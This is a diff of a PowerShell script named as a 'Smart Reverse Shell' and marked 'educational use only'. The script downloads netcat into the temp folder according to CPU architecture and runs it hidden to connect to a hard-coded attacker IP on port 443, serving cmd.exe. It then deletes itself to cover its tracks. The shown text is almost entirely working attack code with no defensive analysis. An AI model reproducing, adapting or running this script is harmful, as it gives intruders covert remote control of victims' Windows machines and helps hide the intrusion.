@@ -1,7 +1,10 @@
-# 1. Enable TLS 1.2 for secure download
+# mrmshell2.ps1 - Smart Reverse Shell (Auto 32/64-bit, TLS, Safe Cleanup)
+# Educational use only
+
+# 1. Enable TLS 1.2
 [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
 
-# 2. Auto-detect OS architecture (32-bit or 64-bit)
+# 2. Auto-detect architecture
 $is64bit = [Environment]::Is64BitOperatingSystem
 $ncUrl = if ($is64bit) {
     "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86_64/nc.exe"
@@ -9,26 +12,27 @@ $ncUrl = if ($is64bit) {
     "https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/nc.exe"
 }
 
-# 3. Configuration
+# 3. Settings
 $ncPath     = "$env:TEMP\nc.exe"
 $attackerIP = "192.168.1.104"
 $port       = "443"
 
-# 4. Download nc.exe (smart)
+# 4. Download nc.exe
 try {
+    Write-Host "[+] Downloading nc.exe..." -ForegroundColor Green
     Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
+    Write-Host "[+] nc.exe downloaded: $ncPath" -ForegroundColor Green
 } catch {
     Write-Error "Download failed: $($_.Exception.Message)"
     exit 1
 }
 
-# 5. Execute reverse shell (hidden)
+# 5. Execute reverse shell
 if (Test-Path $ncPath) {
-    $args = "$attackerIP $port -e cmd.exe"
-    Start-Process -FilePath $ncPath -ArgumentList $args -WindowStyle Hidden -NoNewWindow
+    Start-Process -FilePath $ncPath -ArgumentList "$attackerIP $port -e cmd.exe" -WindowStyle Hidden -NoNewWindow
 }
 
-# 6. Safe self-delete (only if script was run from a file)
+# 6. Safe self-delete
 $scriptPath = $MyInvocation.MyCommand.Path
 if ($scriptPath -and (Test-Path $scriptPath)) {
     Start-Sleep -Seconds 2
